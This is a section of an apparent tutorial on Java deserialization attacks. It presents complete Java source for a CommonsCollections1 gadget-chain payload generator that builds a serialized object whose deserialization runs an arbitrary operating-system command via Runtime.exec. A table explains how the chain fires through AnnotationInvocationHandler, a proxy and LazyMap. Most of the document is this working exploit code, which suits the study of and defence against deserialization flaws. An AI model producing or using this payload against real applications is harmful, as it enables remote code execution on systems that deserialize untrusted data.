## 3. Gadget-chain payload generator

`PayloadGenerator.java` builds the **CommonsCollections1** chain using `InvokerTransformer`, `ChainedTransformer`, `LazyMap`, and `AnnotationInvocationHandler`.

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class PayloadGenerator {

    public static byte[] generate(String command) throws Exception {
        // Step 1: start with a harmless chain so construction does not trigger exec()
        Transformer[] fakeChain = new Transformer[] { new ConstantTransformer(1) };

        // Step 2: the real gadget chain:
        // Runtime.class.getMethod("getRuntime").invoke(null).exec(command)
        Transformer[] realChain = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke",
                new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class },
                new Object[] { command })
        };

        ChainedTransformer chained = new ChainedTransformer(fakeChain);

        // Step 3: LazyMap will run the transformer on a missing key lookup
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chained);

        // Step 4: AnnotationInvocationHandler -> readObject calls memberValues.entrySet()
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> ctor = clazz.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, lazyMap);

        // Step 5: a JDK Proxy for Map routes entrySet() back through the handler
        Map mapProxy = (Map) Proxy.newProxyInstance(
            PayloadGenerator.class.getClassLoader(),
            new Class<?>[] { Map.class },
            handler);

        // Step 6: outer AnnotationInvocationHandler owns the proxy
        InvocationHandler outerHandler = (InvocationHandler) ctor.newInstance(Override.class, mapProxy);

        // Step 7: swap in the real chain only after the object graph is built
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chained, realChain);

        // Step 8: serialize
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(outerHandler);
        }
        return baos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        String command = args.length > 0 ? args[0] : "calc";
        byte[] payload = generate(command);
        try (FileOutputStream fos = new FileOutputStream("payload.ser")) {
            fos.write(payload);
        }
        System.out.println("Wrote payload.ser (" + payload.length + " bytes) for command: " + command);
    }
}
```

### How the chain fires

| Step | Object / call | What happens |
|------|---------------|--------------|
| 1 | `ObjectInputStream.readObject()` | Deserializes `AnnotationInvocationHandler` |
| 2 | `AnnotationInvocationHandler.readObject()` | Calls `memberValues.entrySet()` |
| 3 | `memberValues` is a `Proxy` for `Map` | Intercepted by inner `AnnotationInvocationHandler.invoke()` |
| 4 | `invoke()` calls `memberValues.get("entrySet")` | `memberValues` is a `LazyMap` |
| 5 | `LazyMap.get()` misses `"entrySet"` | Runs the `ChainedTransformer` |
| 6 | `ChainedTransformer` | `Runtime.class` → `getRuntime()` → `exec(command)` |

